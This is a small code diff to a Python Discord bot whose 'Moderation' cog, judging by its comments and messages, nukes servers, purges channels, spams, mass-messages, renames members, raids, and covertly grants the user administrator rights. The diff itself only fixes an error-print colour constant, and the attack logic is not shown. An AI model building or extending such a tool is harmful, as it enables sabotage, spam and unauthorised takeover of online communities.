@@ -112,7 +112,7 @@ class Moderation(commands.Cog):
             print(f"{Fore.LIGHTWHITE_EX}Nuke sucessfully exploded!\n{Fore.RED}\"{quote}\"{Fore.LIGHTWHITE_EX}\n{'-'*(len(quote)+2)}{Fore.RESET}")
             return
         except BaseException as e:
-            print(f"{Fore.LIGHT_RED}{e}\n\n")
+            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
             return
 
     # Nuke every server.
@@ -215,7 +215,7 @@ class Moderation(commands.Cog):
             print(f"{Fore.LIGHTWHITE_EX}All warheads fired.\n{Fore.RED}{quote}{Fore.LIGHTWHITE_EX}\n{'-'*(len(quote))}\n{Fore.RESET}")
             return
         except BaseException as e:
-            print(f"{Fore.LIGHT_RED}{e}\n\n")
+            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
             return
 
     # Delete all channels only.
@@ -239,7 +239,7 @@ class Moderation(commands.Cog):
             print(f"{Fore.LIGHTGREEN_EX}\nChannels purged from server: {g} successfully.{Fore.RESET}")
             return
         except BaseException as e:
-            print(f"{Fore.LIGHT_RED}{e}\n\n")
+            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
             return
 
     # Message all members with a message.
@@ -270,7 +270,7 @@ class Moderation(commands.Cog):
                 f"{Fore.LIGHTGREEN_EX}\nMessaged all members from server: {g} successfully.")
             return
         except BaseException as e:
-            print(f"{Fore.LIGHT_RED}{e}\n\n")
+            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
             return
 
     # Make yourself an administator on the server.
@@ -292,7 +292,7 @@ class Moderation(commands.Cog):
                     f"{Fore.LIGHTGREEN_EX}\nAdministrator permissions granted successfully - try not to get caught!{Fore.RESET}")
                 return
         except BaseException as e:
-            print(f"{Fore.LIGHT_RED}{e}\n\n")
+            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
             return
 
     # Spam all text channels with a message.
@@ -324,7 +324,7 @@ class Moderation(commands.Cog):
                     f"{Fore.LIGHTGREEN_EX}Spamming finished successfully.{Fore.RESET}")
                 return
         except BaseException as e:
-            print(f"{Fore.LIGHT_RED}{e}\n\n")
+            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
             return
 
     # Change the nickname of every member.
@@ -350,7 +350,7 @@ class Moderation(commands.Cog):
                     f"{Fore.LIGHTGREEN_EX}\nNicknamed all members from server: {g} successfully.{Fore.RESET}")
                 return
         except BaseException as e:
-            print(f"{Fore.LIGHT_RED}{e}\n\n")
+            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
             return
 
     # Raid the server.
@@ -446,7 +446,7 @@ class Moderation(commands.Cog):
             print(f"{Fore.LIGHTGREEN_EX}Raiding finished successfully.{Fore.RESET}")
             return
         except BaseException as e:
-            print(f"{Fore.LIGHT_RED}{e}\n\n")
+            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
             return
 
     # Leave all servers.
